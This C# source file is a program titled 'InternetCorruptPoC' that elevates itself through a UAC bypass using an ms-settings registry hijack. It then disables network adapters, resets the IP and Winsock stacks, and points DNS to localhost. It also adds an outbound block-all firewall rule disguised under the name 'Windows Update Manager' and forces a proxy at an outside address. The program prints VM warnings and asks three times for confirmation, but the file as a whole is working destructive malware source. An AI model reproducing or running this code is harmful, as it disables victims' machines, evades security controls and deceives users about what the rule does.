using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Principal;
using NetFwTypeLib;

public class Program
{
    public static void Main()
    {
        if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
        {
            BypassUAC.DoBypass();

            string elevateCmd = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Process.Start("CMD.exe", "/c start \"" + elevateCmd + "\"");

            RegistryKey uacClear = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
            uacClear.DeleteSubKeyTree("shell");
            uacClear.Close();

            Process.GetCurrentProcess().Kill();
            return;
        }

        Console.Title = "InternetCorruptPoC | Made by https://github.com/GabryB03/";

        Console.WriteLine("This program is risky for a normal machine. Run it on a virtual machine.");
        Console.WriteLine("This program will corrupt definitely your internet connection.");
        Console.WriteLine("After executing the payload, internet will be not usable anymore on your PC.");

        for (int i = 0; i < 3; i++)
        {
            string chosen = "";

            while (chosen != "y" && chosen != "n")
            {
                Console.Write($"Are you sure you want to proceed? (y/n) (Confirmation {i + 1}/3): ");
                chosen = Console.ReadLine();

                if (chosen == "n")
                {
                    return;
                }
                else if (chosen != "y")
                {
                    Console.WriteLine("Invalid answer.");
                }
            }
        }

        Console.WriteLine("Corrupting internet feature in the system, please wait a while.");
        CorruptInternet();
        Console.WriteLine("Corruption process done.");
        Console.WriteLine("Internet functionality can not be restored.");
        Console.WriteLine("Press the ENTER key in order to exit from the program.");

        Console.ReadLine();
    }

    private static void CorruptInternet()
    {
        {
            ExecuteCmdCommand("netsh int ip reset");
            ExecuteCmdCommand("netsh int ipv6 reset");
            ExecuteCmdCommand("netsh winsock reset");
        }

        {
            try
            {
                SelectQuery wmiQuery = new SelectQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionId != NULL");
                ManagementObjectSearcher searchProcedure = new ManagementObjectSearcher(wmiQuery);

                foreach (ManagementObject item in searchProcedure.Get())
                {
                    try
                    {
                        if (((string)item["NetConnectionId"]) == "Local Network Connection")
                        {
                            item.InvokeMethod("Disable", null);
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }

        {
            Process.Start("ipconfig", "/flushdns");
            Process.Start("ipconfig", "/release");
            ExecuteCmdCommand("wmic path win32_networkadapter where PhysicalAdapter=True call disable");
            ExecuteCmdCommand("netsh interface set interface \"Local Area Connection\" disable");

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                ExecuteCmdCommand($"netsh interface set interface \"{nic.Name}\" disable");
            }
        }

        {
            try
            {
                string[] Dns = { "127.0.0.1" };
                ManagementClass objMC = new ManagementClass("Win32_NetworkAdapterConfiguration");
                ManagementObjectCollection objMOC = objMC.GetInstances();

                foreach (ManagementObject objMO in objMOC)
                {
                    try
                    {
                        if ((bool)objMO["IPEnabled"])
                        {
                            try
                            {
                                ManagementBaseObject objdns = objMO.GetMethodParameters("SetDNSServerSearchOrder");

                                if (objdns != null)
                                {
                                    objdns["DNSServerSearchOrder"] = Dns;
                                    objMO.InvokeMethod("SetDNSServerSearchOrder", objdns, null);
                                }
                            }
                            catch
                            {

                            }
                        }
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }

        {
            try
            {
                INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_BLOCK;
                firewallRule.Description = "Manages updates into the system.";
                firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
                firewallRule.Enabled = true;
                firewallRule.InterfaceTypes = "All";
                firewallRule.Name = "Windows Update Manager";
                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2"));
                firewallPolicy.Rules.Add(firewallRule);
            }
            catch
            {

            }
        }

        {
            string registryKey = @"Software\Microsoft\Windows\CurrentVersion\Internet Settings";

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKey, true))
                {
                    if (key != null)
                    {
                        key.SetValue("ProxyEnable", 1);
                        key.SetValue("ProxyServer", "5.2.1.39:8080");
                    }
                }
            }
            catch
            {

            }
        }
    }

    private static void ExecuteCmdCommand(string command)
    {
        try
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
        }
        catch
        {

        }
    }
}